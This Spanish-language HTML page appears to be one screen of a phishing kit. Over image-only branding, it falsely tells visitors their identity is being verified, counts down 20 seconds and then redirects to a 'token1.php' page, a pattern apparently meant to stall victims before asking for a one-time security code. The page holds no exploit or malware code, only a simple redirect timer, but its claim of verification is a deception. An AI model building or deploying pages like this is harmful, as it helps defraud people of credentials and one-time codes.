<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

<style type="text/css">
.con {position:relative;width:100%;}
.logo {width:100%;}
.desa {width:100%;}
.form {box-sizing:border-size;font-size:14px;color:green;position:absolute;top:32%;left:60%;
		background-color:white; width:19%; height:30%;}
input {margin-top:2%; width:50%;font-size:10px;}
button {margin-top:10%;margin-left:50%;font-size:16px;border:none;background-color:#145B18;color:white;width:50%;cursor:pointer;}
p { text-align:right;}



.texto1 {
  font-size: 12px;
  font-family: sans-serif;
}

  .gifi {

    width: 150px;
    margin-left: 50px;
    
  }
  
</style>

</head>

<body>
<div class="con" >
<div class="logo" ><img src="im/logoa.png" width="100%"  ></div>

<div class="desa"><img src="im/logob.png" width="100%" ></div>
<div class="fo"><img src="im/logoc.png" width="100%"   ></div>

<div class="form">



<h1 class="texto1" id="CuentaAtras">Por favor, espera 20 segundos, segundos, estamos verificando tu información para confirmar tu identidad. </h1>



 <script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=20;
    
    var url="token1.php";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = "Por favor, espera "+totalTiempo+" segundos, estamos verificando tu información para confirmar tu identidad. <br> ";
 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 1000 milisegundos (1 segundo) */
            setTimeout("updateReloj()",1000);
        }
    }
  window.onload=updateReloj;
 
    </script>











<img class= "gifi" src="/loader.gif">







  
</form>

</div>
</div>
</body>





</html>
